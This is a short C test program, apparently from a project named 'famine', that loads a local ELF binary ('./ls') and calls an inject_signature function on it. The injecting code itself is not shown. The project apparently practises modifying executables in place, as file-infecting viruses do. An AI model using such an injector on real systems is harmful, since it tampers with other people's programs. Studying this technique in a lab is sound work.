#include "../include/famine.h"


int main(void) {
    set_log_level(L_DEBUG);
    DBG("This is a debug message.\n");

    FamineFile *file = elf_file_get("./ls");
    if (file != NULL) {
        DBG("ELF file loaded successfully. Size: %lu bytes\n", file->size);
        inject_signature(file);
        destroy_famine_file(file);
    } else {
        LOG(L_ERROR, "Failed to load ELF file.\n");
    }
}
